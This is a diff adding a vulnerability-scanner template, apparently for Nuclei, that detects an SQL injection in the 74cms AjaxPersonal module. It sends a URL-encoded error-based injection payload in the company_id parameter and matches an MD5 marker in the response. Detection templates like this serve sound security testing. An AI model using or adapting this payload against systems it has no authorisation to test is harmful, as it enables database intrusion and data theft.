@@ -1,0 +1,18 @@
+id: poc-yaml-74cms-sqli
+info:
+  name: 74cms SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects an SQL Injection vulnerability in the 74cms platform via a parameter in the AjaxPersonal module.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php?m=&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=aaaaaaa%29%20and%20extractvalue%281%2Cconcat%280x7e%2Cmd5%2899999999%29%29%29%20--%20a"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "ef775988943825d2871e1cfa75473ec"
